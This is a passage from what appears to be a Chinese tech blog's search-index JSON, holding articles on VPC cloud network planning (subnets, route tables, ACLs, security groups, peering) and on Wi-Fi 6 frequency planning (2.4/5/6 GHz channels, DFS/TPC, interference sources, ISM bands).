href=\"https://www.sdnlab.com/20510.html\">VPC的技术演进历史</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1004614\">经典网络还是VPC，开发者作何选择？</a></li>\n<li><a href=\"https://www.cisco.com/c/dam/assets/global/CN/products/switches/pdf/Design_Guide_for_VXLAN_with_EVPN_Control_Plane.pdf\">VxLan网络设计指南-Cisco</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1647354\">深入浅出云计算VPC网络之VXLAN</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/86734727\">安全组和云防火墙的区别</a></li>\n<li><a href=\"https://www.infoq.cn/article/oagppdcg*a1zqkzgbbcb\">深入浅出 OpenStack 安全组实现原理</a></li>\n</ul>\n"},{"title":"VPC（虚拟私有云）的网络规划","url":"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>虚拟私有云（Virtual Private Cloud，以下简称VPC，有的厂商也称为<code>私有网络</code>），是一个<strong>用户自定义的</strong>、<strong>逻辑隔离</strong>的虚拟网络环境，以提升用户云上资源的安全性，并满足不同的应用场景需求。</p>\n<p>您可以在VPC中定义安全组、VPN、IP地址段、带宽等网络特性。用户可以通过VPC方便地管理、配置内部网络，进行安全、快捷的网络变更。同时，用户可以自定义安全组内与组间弹性云服务器的访问规则，加强弹性云服务器的安全保护。</p>\n<p>从业务连续性的角度，大型业务系统必须支持多中心部署，例如“两地三中心”，“四地八中心”等，为此VPC的网络规划需要基于 Region 和 Zone 。</p>\n<img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/zone.png\" class=\"\">\n\n<h3 id=\"Region-地域\"><a href=\"#Region-地域\" class=\"headerlink\" title=\"Region - 地域\"></a>Region - 地域</h3><p>地域（Region）是指物理的数据中心的地理区域。<br>不同Region之间的距离一般大于30公里（预防地震、战争等严重灾害），但是一般不超过1000公里（过高的网络传输延迟可能影响数据同步）。</p>\n<blockquote>\n<p>不同地域之间的VPC完全物理隔离，不同地域之间的VPC默认不能通过内网通信，只能通过公网进行通信。</p>\n</blockquote>\n<h3 id=\"Zone-可用区\"><a href=\"#Zone-可用区\" class=\"headerlink\" title=\"Zone - 可用区\"></a>Zone - 可用区</h3><p>可用区（Zone）是指同一地域内电力和网络互相独立的物理数据中心。其目标是能够保证可用区间故障相互隔离（大型灾害或者大型电力故障除外），不出现故障扩散，使得用户的业务持续在线服务。</p>\n<p>实际上，Zone就是同一个Region（城）的多个数据中心，一般距离小于30公里，具备独立的物理机房、电力供应和网络传输，而且之间有高速数据专线。</p>\n<h2 id=\"二、VPC的核心组件\"><a href=\"#二、VPC的核心组件\" class=\"headerlink\" title=\"二、VPC的核心组件\"></a>二、VPC的核心组件</h2><p>VPC有几个核心组成部分：私有网络网段、子网、路由表、接入控制列表、安全组。<br>VPC的基本框架如下图：</p>\n<img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-infra.png\" class=\"\">\n\n<h3 id=\"CIDR-私有网络网段\"><a href=\"#CIDR-私有网络网段\" class=\"headerlink\" title=\"CIDR - 私有网络网段\"></a>CIDR - 私有网络网段</h3><p>用户在创建私有网络时，需要用 <code>CIDR</code>（无类别域间路由） 作为私有网络指定 IP 地址组。</p>\n<blockquote>\n<p>私有网络<code>CIDR</code>支持使用如下私有网段中的任意一个：<br>A类：10.0.0.0&#x2F;8，一个A类网络<br>B类：172.16.0.0&#x2F;12，即172.16.0.1-172.31.255.254共16个B类网络<br>C类：192.168.0.0&#x2F;16，即192.168.0.1-192.168.255.254共256个C类网络</p>\n</blockquote>\n<h3 id=\"Subnet-子网\"><a href=\"#Subnet-子网\" class=\"headerlink\" title=\"Subnet - 子网\"></a>Subnet - 子网</h3><p>一个VPC由至少一个子网组成，VPC中的所有云资源（如云服务器、云数据库等）都必须部署在子网内，子网的 CIDR 必须在VPC的 CIDR 内。</p>\n<blockquote>\n<p>单一VPC不能跨Region（如广州IDC）部署，但是可以划分为多个子网，并部署在不同Zone（如广州一区）<br>同一VPC下，不同Subnet之间<strong>默认内网互通</strong><br>不同VPC之间，无论是否在同一地域，均<strong>默认内网隔离</strong>，但可通过创建<strong>对等连接</strong>实现互联互通</p>\n</blockquote>\n<h3 id=\"Router-路由表\"><a href=\"#Router-路由表\" class=\"headerlink\" title=\"Router - 路由表\"></a>Router - 路由表</h3><p>路由表由一系列路由规则组成，用于控制虚拟私有云内子网的出流量走向。</p>\n<blockquote>\n<p>用户创建私有网络时，系统会自动为其生成一个默认路由表，以保证同一个私有网络下的所有子网互通<br>每个子网都必须关联一个路由表，但一个路由表可以关联多个子网</p>\n</blockquote>\n<h3 id=\"ACL（Access-Control-List）-接入控制列表\"><a href=\"#ACL（Access-Control-List）-接入控制列表\" class=\"headerlink\" title=\"ACL（Access Control List） - 接入控制列表\"></a>ACL（Access Control List） - 接入控制列表</h3><p>网络 ACL 是一个子网级别的、无状态的包过滤虚拟防火墙，用于控制进出子网的数据流，可以精确到协议和端口粒度。</p>\n<p>实际上，ACL的本质就是用于描述一个IP数据包、以太网数据帧若干特征的集合。然后根据这些集合去匹配网络中的流量，根据策略来“允许”或者“禁止”。</p>\n<h3 id=\"Secruity-Group-安全组\"><a href=\"#Secruity-Group-安全组\" class=\"headerlink\" title=\"Secruity Group - 安全组\"></a>Secruity Group - 安全组</h3><p>安全组是一种有状态的包过滤虚拟防火墙，用于控制实例级别的出入流量，为同一个VPC内具有相同安全保护需求并相互信任的云服务器提供访问策略。</p>\n<p>系统为每个用户默认创建一个安全组，默认安全组的规则是在出方向上的数据报文全部放行，入方向访问受限，安全组内的云服务器无需添加规则即可互相访问。</p>\n<h2 id=\"三、VPC的增强组件\"><a href=\"#三、VPC的增强组件\" class=\"headerlink\" title=\"三、VPC的增强组件\"></a>三、VPC的增强组件</h2><p>除了VPC路由器、子网、安全组等核心功能，通常VPC还提供一些附加技术组件，以方便租户的系统部署。</p>\n<img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-desktop.png\" class=\"\">\n\n<h3 id=\"EIP（Elastic-IP-Address）-弹性公网IP\"><a href=\"#EIP（Elastic-IP-Address）-弹性公网IP\" class=\"headerlink\" title=\"EIP（Elastic IP Address） - 弹性公网IP\"></a>EIP（Elastic IP Address） - 弹性公网IP</h3><p>弹性公网IP是可以独立购买和持有的公网IP地址资源，实现IP与服务实例分离，可以动态解绑和绑定可绑定到专有网络VPC内的ECS实例、私网SLB实例和NAT网关上。</p>\n<blockquote>\n<p>EIP实则是一种NAT IP，位于阿里云公网网关上，通过NAT映射的方式绑定到VPC网络的ECS&#x2F;SLB&#x2F;NAT等实例的私网网卡上。<br>对于某个VPC，可以在不同Zone的子网上部署多个实例共享EIP，从而实现公网服务的主用&#x2F;备用切换。</p>\n</blockquote>\n<h3 id=\"CLB（Cloud-Load-Balancer，CLB）-负载均衡\"><a href=\"#CLB（Cloud-Load-Balancer，CLB）-负载均衡\" class=\"headerlink\" title=\"CLB（Cloud Load Balancer，CLB）- 负载均衡\"></a>CLB（Cloud Load Balancer，CLB）- 负载均衡</h3><p>CLB提供安全快捷的流量分发服务，访问流量经由 CLB 可以自动分配到云中的多台云服务器上，扩展系统的服务能力并消除单点故障。</p>\n<h3 id=\"对等连接\"><a href=\"#对等连接\" class=\"headerlink\" title=\"对等连接\"></a>对等连接</h3><p>对等连接是指两个VPC之间的网络连接。您可以使用私有IP地址在两个VPC之间进行通信，就像两个VPC在同一个网络中一样。<br>同一区域内，您可以在自己的VPC之间创建对等连接，也可以在自己的VPC与其他帐户的VPC之间创建对等连接。<br>不同区域间的VPC之间不能创建对等连接。</p>\n<h2 id=\"四、几个典型VPC网络的规划分析\"><a href=\"#四、几个典型VPC网络的规划分析\" class=\"headerlink\" title=\"四、几个典型VPC网络的规划分析\"></a>四、几个典型VPC网络的规划分析</h2><h3 id=\"1、AWS的私有网络实例\"><a href=\"#1、AWS的私有网络实例\" class=\"headerlink\" title=\"1、AWS的私有网络实例\"></a>1、AWS的私有网络实例</h3><img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-4.png\" class=\"\">\n\n<p>本VPC的CIDR网络地址块为<code>10.0</code>.0.0&#x2F;16，包含了3个子网：</p>\n<h4 id=\"Subnet1-公网互联出口\"><a href=\"#Subnet1-公网互联出口\" class=\"headerlink\" title=\"Subnet1 - 公网互联出口\"></a>Subnet1 - 公网互联出口</h4><ul>\n<li>子网地址块为<code>10.0.0</code>.0&#x2F;24，位于Zone A</li>\n<li>包含2个实例，分别是 1A 实例（10.0.0.5）和 1B 实例(10.0.0.6）</li>\n<li>1A实例绑定了一个IPV4公网地址（198.51.100.1），1B实例绑定了一个IPV6公网地址</li>\n</ul>\n<h4 id=\"Subnet2-内部应用\"><a href=\"#Subnet2-内部应用\" class=\"headerlink\" title=\"Subnet2 - 内部应用\"></a>Subnet2 - 内部应用</h4><ul>\n<li>子网地址块为<code>10.0.1</code>.0&#x2F;24，位于Zone B</li>\n<li>包含1个实例，2A 实例（10.0.1.5）</li>\n<li>这个子网及其内部实例位于VPC内部，不能直接访问公网，也不能被公网直接访问</li>\n</ul>\n<h4 id=\"Subnet3-系统维护出口\"><a href=\"#Subnet3-系统维护出口\" class=\"headerlink\" title=\"Subnet3 - 系统维护出口\"></a>Subnet3 - 系统维护出口</h4><ul>\n<li>子网地址块为<code>10.0.2</code>.0&#x2F;24，位于Zone C</li>\n<li>包含1个实例，3A 实例（10.0.2.5）</li>\n<li>通过 VPN 连接到企业内部网络，用于开发、维护</li>\n</ul>\n<h3 id=\"2、一个典型的VPC租户\"><a href=\"#2、一个典型的VPC租户\" class=\"headerlink\" title=\"2、一个典型的VPC租户\"></a>2、一个典型的VPC租户</h3><img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-2.png\" class=\"\">\n\n<ul>\n<li>设置独立的互联网边界防火墙，并拥有负载均衡设备CLB，弹性地址EIP。</li>\n<li>内部子网通过ACL实现南北流量控制，安全组负责实现东西流量控制</li>\n</ul>\n<h4 id=\"核心VPC\"><a href=\"#核心VPC\" class=\"headerlink\" title=\"核心VPC\"></a>核心VPC</h4><ul>\n<li>可以认为是一个中台系统，是一个独立的租户</li>\n<li>内部分为2个子网，分别承载数据库系统、后台逻辑</li>\n</ul>\n<h4 id=\"互联网VPC\"><a href=\"#互联网VPC\" class=\"headerlink\" title=\"互联网VPC\"></a>互联网VPC</h4><ul>\n<li>可以认为是某个前台系统，通过VPC边界防火墙与核心VPC互联</li>\n<li>内部分为2个子网，分别承载数据库系统、后台逻辑、前端应用</li>\n</ul>\n<h3 id=\"3、一个大规模的VPC租户\"><a href=\"#3、一个大规模的VPC租户\" class=\"headerlink\" title=\"3、一个大规模的VPC租户\"></a>3、一个大规模的VPC租户</h3><img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-3.png\" class=\"\">\n\n<ul>\n<li>2个Mysql数据库的子网，采用主用&#x2F;备用方式，子网位于不同Zone，有利于提高业务可用性</li>\n<li>2个APP应用的子网，也是位于不同Zone，但是采用双活方案，通过 ELB 实现负载均衡</li>\n<li>独立设置NAT子网，负责保护公网出口</li>\n<li>Bastion是一个堡垒机子网，为开发、维护人员提供安全接入，一般通过浏览器接入云平台门户，不需要公共IP地址，不需要代理，也不需要专门的客户端软件</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://support.huaweicloud.com/eu-west-0-usermanual-vpc/vpc_0001.html\">华为云的网络规划介绍</a></li>\n<li><a href=\"http://www.coding-daddy.com/other/aws-deploy.html#_1-vpc%E5%AE%9A%E4%B9%89\">AWS VPC网络部署参考</a></li>\n<li><a href=\"https://blog.csdn.net/qq_24550639/article/details/109202811\">Azure Bastion 堡垒机的介绍</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/35130978?ivk_sa=1024320u\">UCloud云平台的VPC部署案例</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之一：频率规划","url":"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/","content":"<p>Wi-Fi联盟（英语：Wi-Fi Alliance，缩写WFA），是一个商业联盟，拥有Wi-Fi的商标。它负责Wi-Fi认证，与商标授权的工作，也负责制定Wi-Fi的标准，总部位于美国德州首府Austin。</p>\n<p>Wi-Fi背后的技术标准，是由美国的电气电子工程师协会（IEEE）制定的802.11系列协议。在最初的很多年里，Wi-Fi虽然一代代向前发展，但世界上并没有Wi-Fi几代这样的说法，直接就用802.11后面加几个字母这样的协议编号，对普通用户非常不友好。</p>\n<p>2018年，Wi-Fi联盟决定把下一代技术标准802.11ax用更为简单易懂的Wi-Fi 6来宣传，上一代的802.11ac和802.11n就被追溯成了Wi-Fi 5和Wi-Fi 4，至于Wi-Fi 1&#x2F;2&#x2F;3，并没有得到大规模的推广应用，技术也已淘汰，就没啥好讨论的了。</p>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/wifi.png\" class=\"\">\n\n<p>本文主要讨论Wi-Fi的工作频段，也就是2.4GHz和5GHz，这两个频段均属于ISM频段（Industrial Scientific Medical Band）,详细分析请参见附录一。<br>根据工信部的规定，国内无线接入系统（Wi-Fi）频率的使用范围是：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">系统名称</th>\n<th align=\"center\">频率范围</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">2400MHz 频段无线接入系统</td>\n<td align=\"center\">2400-2483.5MHz</td>\n</tr>\n<tr>\n<td align=\"center\">5100MHz 频段无线接入系统</td>\n<td align=\"center\">5150-5350MHz（仅限于室内使用），其中 5250-5350MHz 应具备DFS功能</td>\n</tr>\n<tr>\n<td align=\"center\">5800MHz 频段无线接入系统</td>\n<td align=\"center\">5725-5850MHz</td>\n</tr>\n</tbody></table>\n<h2 id=\"一、2-4GHz频段\"><a href=\"#一、2-4GHz频段\" class=\"headerlink\" title=\"一、2.4GHz频段\"></a>一、2.4GHz频段</h2><p>使用2.4GHz频段的无线技术标准较多且发展较早，不仅是Wi-Fi，蓝牙和Zigbee等也普遍采用该频段，造成该频段早已拥堵不堪。相对于后来的5GHz频段，2.4G频段的波长更短，传输衰减更小，穿透力更强，但在增强了信号的同时也加剧了2.4GHz频段的干扰。</p>\n<p>ISM中的2.4GHz频段有2.4-2.5GHz，总计100MHz的可用频率。在中国大陆，Wi-Fi被允许使用2.40-2.4835GHz，共计83.5MHz的频率来放置各个信道。</p>\n<ul>\n<li>这些频率被划分为13个20MHz的信道，信道与信道的中心频点之间的频率差为5MHz，共使用2.412-2.472GHz这60MHz频率来放置中心频点</li>\n<li>为了防止信道之间干扰，每个20MHz宽的信道，实际占用22MHz的频率，且信道两端各使用了1MHz保护频率来防止干扰。</li>\n<li>为了不与其他非2.4GHz频段的无线电设备干扰，Wi-Fi还在其起始频率处增加了1MHz的保护频率，来避免与其他频段互相干扰。</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/2.4GHz.png\" class=\"\">\n\n<blockquote>\n<p>信道14的定义不规律，与13信道的间隔为12MHz，位于该ISM频段的上限，在美国和世界大部分地区都被禁止，但在日本却被允许<br>尽管在中国允许使用12-13信道（美国要求限制功率），但由于存在较严重的邻频干扰，许多路由器厂商建议不使用</p>\n</blockquote>\n<ul>\n<li>最初的802.11b，采用22MHz的信道带宽，最多只能容纳3组没有重叠的信道，即：1、6、11。</li>\n<li>后续802.11g&#x2F;n，采用20MHz的信道带宽，可以容纳4组没有重叠的信道，即：1、5、9、13。</li>\n<li>802.11n首次支持40MHz的信道带宽（不支持80MHz带宽），但只有2组没有重叠的信道，即：3、11。</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/24.png\" class=\"\">\n\n<h2 id=\"二、5GHz频段\"><a href=\"#二、5GHz频段\" class=\"headerlink\" title=\"二、5GHz频段\"></a>二、5GHz频段</h2><p>5GHz频段的开放较晚，可用频谱充足（4.910GHz-5.875GHz，有900多M的带宽，是2.4G的10倍还多）、干扰小、速率高，是目前Wi-Fi的首选，但也存在信号穿透力差、空气中衰减较大等问题。常见设备有Wi-Fi、气象雷达、无线图传等。</p>\n<p>5GHz Wi-Fi仍然延续了2.4GHz Wi-Fi信道的命名标准（但为减少干扰，不再允许信道之间频率重叠），从5.0GHz开始称为信道1，每个信道宽度为20Mhz，之后每隔5MHz中心频率，信道数增加1。例如，38信道就是指中心频率为5190Mhz，宽度为20MHz的信道。</p>\n<p>2002年，工信部发布了<a href=\"https://www.miit.gov.cn/jgsj/wgj/wjfb/art/2020/art_bfd0fd64e0a1427aaf8aff18a01c0fd0.html\">5.8GHz的频率管理规定</a>，开放了5.8GHz频段（也称为5GHz高频段），范围为5.745–5.825GHz，共计100MHz，划分为149-165信道。</p>\n<blockquote>\n<p>当时，该频段也被移动运营商用于无线局域网的CPE接入，但工信部要求须取得相应的基础电信业务经营许可，且收取频率占用费。</p>\n</blockquote>\n<p>2012年，中国工信部正式开放5.2GHz频段（也称为5GHz低频段），范围为5150-5350MHz，共计200MHz频率，划分为高低部分，各100Mhz。其中：</p>\n<ul>\n<li>5170-5250MHz，共80MHz，划分为36-48信道，可以直接使用，</li>\n<li>5250-5330MHz，共80MHz，划分为52-64信道，为DFS信道；</li>\n<li>信道前后各空余的20Mhz频率作为保护带使用</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/5GHz.jpg\" class=\"\">\n\n<p>根据IEEE 802.11系列标准，Wi-Fi可以采用20MHz、40MHz、80MHz和160MHz等4种方式，信道越宽，传输速率也越高。</p>\n<ul>\n<li>对于20MHz带宽，5GHz频段可以容纳13个信道，包括5.2GHz的8个信道(其中4个需支持DFS)，和5.8GHz的5个信道</li>\n<li>对于40MHz带宽，5GHz频段可以容纳6个信道，包括5.2GHz的4个信道（其中2个需支持DFS），和5.8GHz的2个信道</li>\n<li>对于80MHz带宽，5GHz频段可以容纳3个信道，包括5.2GHz的2个信道（其中1个需支持DFS），和5.8GHz的1个信道</li>\n<li>中国目前不允许160MHz带宽，因为5.8Ghz频段的带宽不足，而5.2GHz频段由于需要支持DFS无法使用</li>\n</ul>\n<h2 id=\"三、DFS-TPC\"><a href=\"#三、DFS-TPC\" class=\"headerlink\" title=\"三、DFS &amp; TPC\"></a>三、DFS &amp; TPC</h2><p>由于许多军用、气象用雷达也都使用5GHz的频段，当中有些频段与Wi-Fi有所重叠，例如欧洲军方的雷达系统广泛运用这一频率(其中探测隐型飞机的雷达就使用这一频率)，如果民用的无线产品也使用这一频率，很可能会对军事雷达和通讯产生干扰。为此，IEEE组织制定了<strong>802.11h</strong>规范并要求Wi-Fi厂商遵循，也就是：<code>Auto DFS + Auto TPC = 802.11h</code>。</p>\n<p>简单来说，DFS就是要求无线产品主动探测军方使用的频率，并主动选择其他频率以避免干扰。<br>DFS（Dynamic Frequency Selection）动态频率选择，是通过动态将5GHz无线电的工作频率切换到不干扰雷达的频率以避免干扰雷达信号的过程。<br>TPC（Transmit Power Control）发射功率控制，是指根据法规要求和范围信息来调整无线电的发射功率。</p>\n<p>802.11h的技术认证是属于强制性的，不符合标准的产品将不会获得欧盟及有此项规范要求的国家的无线产品上市许可。目前世界各国对Auto DFS &amp; Auto TPC的使用频率范围规定不一，但要求具备这两项机能的趋势，却是确定的。其核心要求是：</p>\n<ul>\n<li>DFS频道时不得在户外环境、只能在室内使用</li>\n<li>当Wi-Fi路由器准备启用DFS信道之前，必须先<strong>静默等待60秒</strong>，以确认没有军事与气象雷达正在使用</li>\n<li>具备实时侦测军事与气象雷达信号的能力，一旦发现必须自动回避并切换到监管允许的其他频道，以免干扰到军事雷达与气象雷达运作</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/dfs.jpeg\" class=\"\">\n\n<blockquote>\n<p>在中国，政府规定52-64信道需满足DFS要求，为避免DFS功能造成数据传输中断，路由器厂商通常不使用这些信道用于MESH回传中继</p>\n</blockquote>\n<h2 id=\"四、关于频率干扰的讨论\"><a href=\"#四、关于频率干扰的讨论\" class=\"headerlink\" title=\"四、关于频率干扰的讨论\"></a>四、关于频率干扰的讨论</h2><h3 id=\"其他通讯协议\"><a href=\"#其他通讯协议\" class=\"headerlink\" title=\"其他通讯协议\"></a>其他通讯协议</h3><p>由于ISM频段无需授权，除了Wi-Fi以外，许多通信协议也在同时使用这些频段。</p>\n<ul>\n<li>蓝牙同样采用2.4GHz频段（2.400-2.4835MHz），规划了40个物理信道，每个信道带宽2MHz，包含3个广播信道和37个数据信道<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/bluetooth.png\" class=\"蓝牙和Wi-Fi的信道对比\"></li>\n<li>大疆公司开发的全高清数字图像传输系统Lightbridge，同样工作在2.4GHz和5GHz频段，但自主开发了基于广播模式的数据协议，由于省略了握手的协议开销，延迟更短，速率更高，传输距离也高达1.7公里。</li>\n<li>基于IEEE 802.15.4标准的ZigBee协议、LoRa协议也使用2.4GHz频段</li>\n<li>高速公路ETC收费系统使用基于5.8GHz的有源电子标签</li>\n</ul>\n<h3 id=\"USB-3-0\"><a href=\"#USB-3-0\" class=\"headerlink\" title=\"USB 3.0\"></a>USB 3.0</h3><p>2012年，Intel发布了技术白皮书<a href=\"https://www.usb.org/sites/default/files/327216.pdf\">《USB 3.0 Radio Frequency Interference Impact on 2.4 GHz Wireless Devices》</a>，明确指出USB3.0在使用时，会在2.4G频段增加约20dB的噪声，造成对ISM频段的射频干扰。这种干扰会降低无线接收的灵敏度，进而缩减收讯范围，足以影响干扰无线设备（无线网卡、无线鼠标及无线耳机等）的正常使用。</p>\n<p>实际上，USB 3.0的信号速率是５Gbit&#x2F;s，但由于USB 3.0芯片需要支持数据加密，为此在时钟上应用了扩频技术，导致其频谱从0Hz一直延伸到5GHz。经Intel测量，干扰功率随频率下降，在2.4G频段约有-60dBm，到5G频段只有-90dBm。很可惜的是，这个由USB 3.0高频通讯所产生的噪讯是一种宽频噪讯，因此无法被过滤消除，而且刚好落在常用的2.4-2.5GHz的频段范围。</p>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/usb.jpeg\" class=\"\">\n\n<p>Intel建议的解决方式是对USB 3.0连接器及周边装置进行遮蔽设计，做得愈彻底，效果愈好。此外，无线天线放得离USB 3.0连接器及装置也要愈远愈好。</p>\n<blockquote>\n<p>路由器厂商通常建议用户关闭USB 3.0接口，改用USB 2.0模式。</p>\n</blockquote>\n<h3 id=\"微波炉\"><a href=\"#微波炉\" class=\"headerlink\" title=\"微波炉\"></a>微波炉</h3><p>此外，家用微波炉也可能对2.4GHz产生严重干扰，因为其辐射频段是2.450GHz，而且功率超大，但前提是微波炉的密封不好造成辐射泄露。有兴趣的，可以看看<a href=\"https://news.sciencenet.cn/htmlnews/2015/5/318644.shtm\">1998年澳大利亚Parkes射电天文望远镜的乌龙事件</a>。</p>\n<h2 id=\"五、其他频段\"><a href=\"#五、其他频段\" class=\"headerlink\" title=\"五、其他频段\"></a>五、其他频段</h2><p>在美国，Wi-Fi可以采用3.9GHz频段，具体为3.655-3.695GHz之间的40M带宽，但必须获得政府许可执照。<br>此外，美国Wi-Fi还采用了4.6GHz频段，具体为4.940-4.990GMHz的50M带宽，但仅限美国公共安全机构使用。</p>\n<p>当前，Wi-Fi的下阶段演进目标是<strong>WiFi 6E</strong>，多了一个E，代表着“Extended”，扩展的意思，主要改进点在于支持 6GHz频段，这就意味着WiFi 6E设备能够支持2.4GHz、5GHz和6GHz三个频段，并由此带来了很多优势。</p>\n<p>与已经普遍使用的2.4GHz、5GHz频段相比，6GHz频段在很多地区还未开放，所以使用6GHz频段的设备比较少，自然在这个频段上的拥堵、干扰就比较少。同时6GHz频段处于5925-7125MHz之间，包含7个160MHz信道、14个80MHz信道、29个40MHz信道、60个20MHz信道，总计110个信道。信道数量比5GHz频段和2.4GHz频段有了大幅的增长，带来更为强悍的吞吐能力，特别是160MHz信道从5GHz的1个提升到了7个，能实现7条互不干扰的连接了。</p>\n<hr>\n<h2 id=\"附录一：ISM（Industrial-Scientific-Medical）频段\"><a href=\"#附录一：ISM（Industrial-Scientific-Medical）频段\" class=\"headerlink\" title=\"附录一：ISM（Industrial Scientific Medical）频段\"></a>附录一：ISM（Industrial Scientific Medical）频段</h2><p>ISM频段（Industrial Scientific Medical Band）主要是开放给工业、科学和医用3个主要机构使用的公共频段资源。<br>无需事前获得政府机构的授权，任何人都可以使用ISM频段进行数据传输，但必须遵循管制要求限制发射功率，目的是控制辐射范围以避免干扰他人使用。当然，如果ISM频段内的无线电设备之间产生了干扰，原则上也不受政府保护，使用者应自行解决或协商解决。</p>\n<p>在美国，ISM频段是由美国联邦通信委员会（FCC）负责定义，其他大多数国家和地区的政府也都安排了ISM频段，但具体规定并不统一。</p>\n<p>在我国，根据《中华人民共和国无线电频率划分规定》及其中脚注5.138和5.150，规定：</p>\n<ul>\n<li>6765-6795kHz（中心频率6780kHz）、61-61.5GHz（中心频率61.25GHz）、122-123GHz（中心频率122.5GHz）、244-246GHz（中心频率245GHz）频段用于ISM应用，但其使用须经无线电主管部门给予特别批准；</li>\n<li>13553-13567kHz（中心频率13560kHz）、26957-27283kHz（中心频率27120kHz）、40.66-40.7MHz（中心频率40.68MHz）、2400-2500MHz（中心频率2450MHz）、5725-5875MHz（中心频率5800MHz）、24-24.25GHz（中心频率24.125GHz）频段也用于ISM应用，在这些频段内工作的无线电业务必须承受由于这些ISM应用产生的有害干扰</li>\n<li>国际上，433.05-434.79MHz（中心频率433.92MHz）频段是国际电联第一区部分欧洲国家指定用于ISM应用的频段，902-928MHz（中心频率915MHz）频段是美国等国际电联划分的第二区国家指定用于ISM应用的频段，上述指定用于ISM应用的频段也划分给了无线电业务使用，不论是ISM应用还是符合划分的无线电业务，都可以使用上述频段，但均要符合我国无线电管理有关规定</li>\n</ul>\n<p>Wi-Fi所使用的2.4G频段与5.8G频段就落在全球各国共有的ISM频段上，此外常见的ISM频段还有：</p>\n<h3 id=\"13-56MHz\"><a href=\"#13-56MHz\" class=\"headerlink\" title=\"13.56MHz\"></a>13.56MHz</h3><p>频率范围为13.553-13.567MHz，处于短波频段。<br>这是最典型的RFID &#x2F; NFC高频工作频率，是实际应用中使用量最大的电子标签，国际标准有ISO14443、ISO15693和ISO18000-3等。</p>\n<blockquote>\n<p>传统ID卡的工作片一般是125KHz或135kHz，属于低频卡，常见国际标准有ISO11784&#x2F;11785、ISO18000-2等。<br>但是，30KHz～300KHz的低频卡通常并不纳入ISM频段范围。</p>\n</blockquote>\n<h3 id=\"27-125MHz\"><a href=\"#27-125MHz\" class=\"headerlink\" title=\"27.125MHz\"></a>27.125MHz</h3><p>频率范围为26.957-27.283MHz。<br>除了电感耦合RFID系统外，这个频率范围的ISM应用还有医疗用电热治疗仪、工业用高频焊接装置和传呼机等，国内很多遥控玩具工作频率在27MHz.</p>\n<h3 id=\"315MHz\"><a href=\"#315MHz\" class=\"headerlink\" 